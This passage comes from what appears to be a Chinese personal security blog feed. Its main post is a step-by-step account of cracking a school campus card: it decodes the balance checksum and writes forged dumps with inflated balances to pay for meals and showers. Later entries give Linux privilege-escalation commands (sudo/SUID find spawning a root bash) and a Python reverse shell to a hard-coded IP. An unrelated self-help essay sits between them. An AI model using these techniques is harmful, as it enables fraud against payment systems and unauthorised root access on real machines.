alt="我是如何破解学校一慧通的"></p><p>因为这三个文件都是同一张卡片不同金额的dump文件，所以假定有金额的数据不同，有刷</p><p>卡次数记录的数据不同，刷卡时间的记录不同，（假定会有这些不同之处，也许只有记录</p><p>金额的变化），通过对比两张卡片，发现在00000901有不同的数据块 </p><p><strong>如图</strong></p><p>余额为29.85：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/09.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.83：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/10.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.33：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/11.png" alt="我是如何破解学校一慧通的"></p><p>发现这两张卡内的不同之处在于：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/12.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/13.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/14.png" alt="我是如何破解学校一慧通的"></p><p>将十进制金额转换为十六进制为：</p><pre><code class="hljs basic"><span class="hljs-symbol">2985 </span>= BA9<span class="hljs-symbol">2983 </span>= BA7<span class="hljs-symbol">2933 </span>= B75</code></pre><p>可以看出</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">B</span><span class="hljs-keyword">A7 </span><span class="hljs-keyword">B</span><span class="hljs-keyword">75 </span><span class="hljs-keyword">B</span></code></pre><p>得出结论</p><pre><code class="hljs ini"><span class="hljs-attr">B2</span> = B<span class="hljs-attr">BC</span> = B<span class="hljs-attr">6E</span> = B</code></pre><p>当时想这个B是怎么来的，想了好久，后来发现，将两个不同的数据块进行xor运算：</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">xor </span><span class="hljs-keyword">B2 </span>= <span class="hljs-number">1</span>B<span class="hljs-built_in">A7</span> <span class="hljs-keyword">xor </span><span class="hljs-keyword">BC </span>= <span class="hljs-number">1</span>B<span class="hljs-number">75</span> <span class="hljs-keyword">xor </span><span class="hljs-number">6</span>E = <span class="hljs-number">1</span>B</code></pre><p><strong>xor是如何进行运算的</strong></p><p>例如：</p><pre><code class="hljs dns">A9 xor B2 = <span class="hljs-number">1</span>B将A9转换为二进制为<span class="hljs-number">10101001</span>将B2转换为二进制为<span class="hljs-number">10110010</span><span class="hljs-number">10101001</span><span class="hljs-number">10110010</span>————<span class="hljs-number">00011011</span>然后将<span class="hljs-number">00011011</span>转换成十六进制等于<span class="hljs-number">1</span>B</code></pre><p>我把金额改成40元</p><p>40转换成十六进制为：</p><p>40-4000-FA0</p><p>A0 xor ？= 1F</p><p>将A0转换为二进制为10100000</p><p>将1F转换为二进制为11111</p><p>10100000</p><p>​       ？</p><p>————</p><p>   11111</p><p>可以得出问好区域是10111111</p><p>10111111转换为十六进制为BF</p><p>直接在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/15.png" alt="我是如何破解学校一慧通的"></p><p>直接保存为40.dump</p><p>通过NFCGUI-PRO.exe软件将dump文件写入到空白卡片中：</p><p><strong>如图:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/16.png" alt="我是如何破解学校一慧通的"></p><p>打开NFCGUI-PRO.exe软件后DUMP和Key文件选择加载文件40.dump</p><p>将ACR122U插入到电脑后将空白卡片放到读卡器上后选择写入文件</p><p>写入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/17.png" alt="我是如何破解学校一慧通的"></p><p>当我拿去测试时，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/18.png" alt="我是如何破解学校一慧通的"></p><p>没错，读不出来……</p><p>然后我的思绪就这样断了…</p><p>我又拿水卡刷了几次后，卡内余额剩余25.90时，终于又发现了….</p><p><strong>如图：</strong></p><p>余额：29.33元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/19.png" alt="我是如何破解学校一慧通的"></p><p>余额：25.90元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/20.png" alt="我是如何破解学校一慧通的"></p><p>把金额转换为十六进制</p><pre><code class="hljs apache"><span class="hljs-attribute">29</span>.<span class="hljs-number">33</span>—<span class="hljs-number">2933</span>—B<span class="hljs-number">75</span><span class="hljs-attribute">25</span>.<span class="hljs-number">90</span>—<span class="hljs-number">2590</span>—A<span class="hljs-number">1</span>E</code></pre><p>这样子应该就可以看出了</p><p>40转换成十六进制为：</p><p><code>40-4000-FA0</code></p><p><font color='32CD32'>/*这些上面说过了，怕有些人看不懂我再写一下过程</font></p><p><font color='32CD32'>A0 xor ？= 1F</font></p><p><font color='32CD32'>将A0转换为二进制为10100000</font></p><p><font color='32CD32'>将1F转换为二进制为11111</font></p><p><font color='32CD32'>10100000</font></p><p><font color='32CD32'>       ？</font></p><p><font color='32CD32'>————</font></p><p><font color='32CD32'>   11111</font></p><p><font color='32CD32'>可以得出问好区域是10111111</font></p><p><font color='32CD32'>10111111转换为十六进制为BF</font></p><p><font color='32CD32'>*/</font></p><p>在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/21.png" alt="我是如何破解学校一慧通的"></p><p>存为40.dump</p><p>写入我就不再继续说了</p><p>我拿卡去测试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/22.png" alt="我是如何破解学校一慧通的"></p><p>破解成功！！！！</p><blockquote><p>改成999.99太张扬了，而且某些原因，没数据可以分析，所以我加到40就够了！</p></blockquote><h2 id="二、破解洗澡功能"><a href="#二、破解洗澡功能" class="headerlink" title="二、破解洗澡功能"></a>二、破解洗澡功能</h2><p>男寝装备落后，没有插卡机，花了我5块大洋激活洗澡功能。</p><p>经过妹子帮忙多次消费后（可惜那个妹子现在娃都会打酱油了），得出6次数据，4次自己卡中的数据，2次妹子卡中的数据。</p><p>经过对比扇区数据不同后，确定了金额的位置，</p><p>这4次是我自己的数据，如图：</p><p>3.14</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/23.png" alt="我是如何破解学校一慧通的"></p><p>3.20</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/24.png" alt="我是如何破解学校一慧通的"></p><p>4.22</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/25.png" alt="我是如何破解学校一慧通的"></p><p>5.00</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/26.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子卡中的两次数据，如图:</p><p>0.16</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/27.png" alt="我是如何破解学校一慧通的"></p><p>4.78</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/28.png" alt="我是如何破解学校一慧通的"></p><p>将金额转换成十六进制为：</p><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">14</span> = <span class="hljs-number">314</span> = <span class="hljs-number">13</span>A<span class="hljs-attribute">3</span>.<span class="hljs-number">20</span> = <span class="hljs-number">320</span> = <span class="hljs-number">140</span><span class="hljs-attribute">4</span>.<span class="hljs-number">22</span> = <span class="hljs-number">422</span> = <span class="hljs-number">1</span>A<span class="hljs-number">6</span><span class="hljs-attribute">5</span>.<span class="hljs-number">00</span> = <span class="hljs-number">500</span> = <span class="hljs-number">1</span>F<span class="hljs-number">4</span><span class="hljs-attribute">0</span>.<span class="hljs-number">16</span> = <span class="hljs-number">16</span> = <span class="hljs-number">10</span><span class="hljs-attribute">4</span>.<span class="hljs-number">78</span> = <span class="hljs-number">478</span> = <span class="hljs-number">1</span>DE</code></pre><p>我卡中的数据不同的区域用红色的标记起来：</p><p><strong>3.14</strong></p><p>00 00 00 35 A0 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 001E</p><p><strong>3.20</strong></p><p>00 00 00 35 A0 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 001E</p><p><strong>4.22</strong></p><p>00 00 00 35 A0 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 001E</p><p><strong>5.00</strong></p><p>00 00 00 35 A0 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 001E</p><p>我用3.14为例。<font color='red'>3A 01</font>区域有两处，可以看出金额3.14转换成十六进制是13A，后两位就是3A，第一位是1。这样就可以确定3A01是如何来的。</p><p>关于C5是如何来的，经过我多次分析加运算后得知</p><p><font color='Blue'>FF - 3A = C5</font> 这样一来也可以知道C5是如何得来的</p><p>我想把金额改成40元，40转换十六进制为40.00 =4000 = FA0</p><p>FF - A0 = 5F</p><p>可以得出40的数据为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>不过当我写进卡里时….</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/29.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子拍给我的照片….</p><p>后来我对比妹子的两个数据</p><p>0.16</p><p>00 00 00 72 6A <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00</p><p>1D E2 1D E2 <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00 1E</p><p>4.78</p><p>00 00 00 72 6A <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE</font> FF FF <font color='red'>DE 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE </font>FF FF <font color='red'>DE 01</font> 00 00 1E</p><p>又有一个地方产生了变化….</p><p>0.16时为FF，4.78为FE</p><p>计算得出加密方法：</p><p>0.16为例</p><p>FF xor EF = 10</p><p>10 + 00 = 10</p><p>经过多次运算，所有金额数据都符合这个规律</p><p>继续转到40的金额 </p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 001E</p><p>这是之前的数据</p><p>A0 + 0F = AF</p><p>? Xor 5F =AF</p><p>关于xor的运算之前已经说过这里就不多说了</p><p>得出结果为F0</p><p>将数据改为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>写进卡中后</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/30.png" alt="我是如何破解学校一慧通的"></p><p>成功，据说每次插进去都会少0.06，这就是传说中的吞钱？？</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>一卡通有三个功能，吃饭的功能没去研究，就这样吧。</p><p>文章写得简单，可过程经过多次测试与计算。</p><p>最后祝各位看到此文章的学子们在大学期间都能找到自己的真爱。</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个人开始废掉的3个迹象</title>
    <link href="/p/65c9d71c.html"/>
    <url>/p/65c9d71c.html</url>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是说：“马上马上，就看1分钟，再看1分钟！”</p><p>　　可问题是，1分钟常常演变成10分钟、1小时，甚至一整天。</p><p>　　我知道，网上有许多表弟感兴趣的内容，尤其系统还会根据他过去浏览的信息，有针对性地进行推送。比如表弟爱看幽默搞笑的段子，系统就会推送更多的类似视频给他。</p><p>　　但是，如果没有足够的自制力去抵御外界的诱惑，过度沉迷于即时快感，那离废掉也就不远了。</p><p>　　心理学上有一个“花盆效应”，说的是人如果在舒适的“花盆”中待久了，就容易不思进取、安于现状。</p><p>　　<strong>如果你天天禁锢在自己的小圈子里，沉溺在自己的舒适区不可自拔，而不是用心花时间提升自己，怎么可能走向更广阔的天地呢？</strong></p><p>　　人生如逆水行舟，不进则退。如果选择过分安逸，就会丧失斗志；如果丧失了斗志，生活就会越来越闲；如果越来越闲，最终就会和别人拉开一大截差距。</p><p>　　现在有多不思进取，将来被时代所抛弃时就有多后悔莫及。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>　　前几天，我的叔叔失业了，这沉重的一击害得他整天抽烟解闷，觉得在阿姨面前抬不起头来。</p><p>　　其实，叔叔的情况，我们都早有耳闻。他自认为自己技术过硬，曾经又获得过公司的先进，就终日懒懒散散、不思进取，躺在过去的功劳簿上睡大觉。</p><p>　　半年前，公司新招聘了个名校毕业的小伙子。小伙子吃苦耐劳，肯学肯干，技术水平早就在叔叔之上。</p><p>　　叔叔也不是没有危机感，但他觉得，自己年纪大了，记性也差了，现在要学新东西也难了，常常是一边嘴里满是焦虑，一边又没有实际行动。</p><p>　　现在工作被人取代，叔叔这才后悔莫及：试想，如果自己还是当年那个技术骨干，公司会让自己说走就走吗？</p><p>　　说到底，这是他自己长期满足于现状、停止学习的代价。</p><p>　　职场是个靠价值说话的地方，你有多少价值，决定了你能站上多高的位置。但凡有所成就的人，注定终身与读书和学习形影不离。</p><p>　　<strong>只要你还在学习，人生就有无限可能。</strong></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>　　两个月前，闺蜜再一次立下誓言：暴瘦20斤。</p><p>　　闺蜜是个吃货，见到啥好东西都管不住嘴，再加上迈不开腿，所以体重跟着蹭蹭蹭直线上升。</p><p>　　我激励她：“不减下来，别来见我。”在那之后，她果然坚持跑步了一阵子。但没多久，她就又一切照旧了。</p><p>　　“你不知道，跑多了腿酸。”</p><p>　　“这是下雪天啊！会冻死的啊！”</p><p>　　“啊，这么好吃的布丁，别拦我！”</p><p>　　她总会有这样七七八八的理由。所以，如今见到她，还是老样子。</p><p>　　生活中，总有一些人嚷嚷着要实现什么样的目标，却总是不能如愿，归根结底，缺的是自律。<strong>放弃了自律，迟早有一天要为过去的偷懒买单。</strong></p><p>　　有句话说得好：自律，出众；不自律，出局。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>　　没有人天生就是王者。</p><p>　　说到底，一个人能有怎样的人生，走在什么样的路上，是痛苦还是快乐、失败还是成功，最终取决于自己。</p><p>　　如果你的生活中，出现了不再愿意走出舒适区、停止了学习、放弃了自律这三种迹象，那就要提醒自己注意了。</p><p>　　因为，成功，属于懂得走出舒适区、积极进取的人；</p><p>　　属于坚持读书和学习的人；</p><p>　　属于能够保持高度自律的人。</p><p>　　<strong>与其怨天尤人，“望洋兴叹”，不如从现在开始，脚踏实地，不负韶华，努力成为更好的自己。</strong></p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之Sudo配置错误</title>
    <link href="/p/94404766.html"/>
    <url>/p/94404766.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之Suid提权</title>
    <link href="/p/a20c8cf4.html"/>
    <url>/p/a20c8cf4.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之定时任务</title>
    <link href="/p/75fd4604.html"/>
    <url>/p/75fd4604.html</url>
    
